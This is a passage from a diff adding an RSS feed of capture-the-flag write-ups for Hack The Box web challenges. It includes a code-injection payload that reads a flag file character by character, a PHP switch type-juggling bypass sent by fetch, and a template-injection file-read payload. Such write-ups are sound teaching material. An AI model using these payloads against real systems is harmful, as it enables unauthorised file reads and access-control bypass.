+      &lt;span style=&#34;color:#a6e22e&#34;&gt;attack_power&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;,
+      &lt;span style=&#34;color:#a6e22e&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`+ ord(open(&amp;#34;../../../flag.txt&amp;#34;).read()[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]);`&lt;/span&gt;,
+    }),
+  })
+    .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;) =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;())
+    .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;) =&amp;gt; {
+      &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
+    });
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then I got the result in ascii unicode, so I converted it back to characters using the following function :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;chr(ascii unicode)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The Flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;juggling-facts&#34;&gt;Juggling Facts&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;An organization seems to possess knowledge of the true nature of pumpkins. Can you find out what they honestly know and uncover this centuries-long secret once and for all?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;solution-2&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;When i press &lt;code&gt;Secret Facts&lt;/code&gt; it shows : &lt;code&gt;Secrets can only be accessed by admin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://postimg.cc/VdM7SY9r&#34;&gt;&lt;img src=&#34;https://i.postimg.cc/yYp2bxkP/Screen-Shot-2022-10-28-at-2-47-04-PM.png&#34; alt=&#34;Screen-Shot-2022-10-28-at-2-47-04-PM.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Since this challenge’s name is Juggling Facts, I’ll google php juggling.&lt;/p&gt;
+&lt;p&gt;Now, we can dig deeper in this exploit: &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling&#34;&gt;PayloadAllTheThings&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://postimg.cc/SYmPLR6x&#34;&gt;&lt;img src=&#34;https://i.postimg.cc/NFXwcrLm/a5.png&#34; alt=&#34;a5.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;It seems like &lt;code&gt;IndexController.php&lt;/code&gt; is vulnerable:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($jsondata[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;secrets&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;)
+        {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $router&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;jsonify&lt;/span&gt;([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Currently this type can be only accessed through localhost!&amp;#39;&lt;/span&gt;]);
+        }
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($jsondata[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;])
+        {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;secrets&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $router&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;jsonify&lt;/span&gt;([
+                    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;facts&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;facts&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get_facts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;secrets&amp;#39;&lt;/span&gt;)
+                ]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first if statement is NOT vulnerable, as it’s using strict comparison (&lt;code&gt;===&lt;/code&gt;, &lt;code&gt;!==&lt;/code&gt;). So, we have to parse the type &lt;code&gt;POST&lt;/code&gt; parameter.&lt;/p&gt;
+&lt;p&gt;However, the &lt;code&gt;switch&lt;/code&gt; statement is vulnerable, According to official &lt;a href=&#34;https://www.php.net/manual/en/control-structures.switch.php&#34;&gt;PHP documentation&lt;/a&gt; switch/case does &lt;a href=&#34;php.net/manual/en/types.comparisons.php#types.comparisions-loose&#34;&gt;loose comparision&lt;/a&gt;.
+Since the case secrets is the first item, it can bypass the &lt;code&gt;REMOTE_ADDR&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So the final payload to be sent as a POST reqeust to api:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[IP]/api/getfacts&amp;#39;&lt;/span&gt;, {&lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;}, &lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({&lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;})});
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got the flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{sw1tch_stat3m3nts_4r3_vuln3r4bl3!!!}
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;spookifier&#34;&gt;Spookifier&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;There&amp;rsquo;s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;solution-3&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;First thing i did is try Server Side Template Injection, which allows RCE. Even if you are not sure from the source code whether it is vulnerable, you could try fuzzing in a few inputs. I tried &lt;code&gt;{{5*5}}&lt;/code&gt;, &lt;code&gt;{5*5}&lt;/code&gt; and &lt;code&gt;${5*5}&lt;/code&gt; and found that &lt;code&gt;${5*5}&lt;/code&gt; worked to display 25 on the webpage!&lt;/p&gt;
+&lt;p&gt;Perfect, now all we need to do is to read the flag with the payload &lt;code&gt;${open(&amp;quot;/flag.txt&amp;quot;).read()}&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The Flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
+&lt;/code&gt;&lt;/pre&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
